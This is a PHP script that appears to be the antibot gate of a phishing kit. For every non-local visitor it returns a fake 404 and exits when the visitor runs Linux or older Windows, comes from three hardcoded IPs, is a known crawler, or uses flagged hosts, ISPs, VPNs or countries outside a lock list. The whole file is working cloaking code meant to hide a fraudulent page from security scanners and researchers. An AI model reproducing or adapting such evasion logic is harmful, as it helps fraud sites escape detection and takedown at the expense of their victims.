<?php

    if (file_exists('./job/spec/Comp.php')) {
        require_once './job/spec/Comp.php';
        require_once './job/spec/Antibot.php';
        require_once './job/python/autoload.php';
    } else {
        require_once '../job/spec/Comp.php';
        require_once '../job/spec/Antibot.php';
        require_once '../job/python/autoload.php';
    }

    use Jaybizzle\CrawlerDetect\CrawlerDetect;

    $comps = new Comp;
    $antibot = new Antibot;
    $antibotList = new IpBlockList;
    $spider = new Spider;
    $crawler = new CrawlerDetect;

    if (!$comps->localhost($_SESSION['ip'])) {
        if ($comps->getOS() == "Windows 95" ||
            $comps->getOS() == "Windows 98" ||
            $comps->getOS() == "Windows ME" ||
            $comps->getOS() == "Windows 2000" ||
            $comps->getOS() == "Windows Server 2003/XP x64" ||
            $comps->getOS() == "Windows Vista" ||
            $comps->getOS() == "Windows XP" ||
            $comps->getOS() == "BlackBerry" ||
            $comps->getOS() == "Linux" ||
            $comps->getOS() == "Ubuntu" ||
            $comps->getOS() == "Unknown OS") {
            echo $antibot->throw404();
            die();
        }
    
        if ($_SESSION['ip'] == "92.23.57.168" || $_SESSION['ip'] == "96.31.1.4" || $_SESSION['ip'] == "207.96.148.8") {
            echo $antibot->throw404();
            die();
        }

        if ($spider->checkSpider()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkHost()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkISP()) {
            echo $antibot->throw404();
            die();
        }
    
        if (isset($settings['VPN']) && $settings['VPN'] == "on") {
            if ($antibot->checkVPN() == "Y") {
                echo $antibot->throw404();
                die();
            }
        }
    
        if ($crawler->isCrawler()) {
            echo $antibot->throw404();
            die();
        }
    
        if (!$antibotList->ipPass($_SESSION['ip'])) {
            echo $antibot->throw404();
            die();
        }

        if (isset($settings['LockCountry']) && $settings['LockCountry'] != "off") {
            if (!$antibot->countryLock()) {
                echo $antibot->throw404();
                die();
            }
        }
    }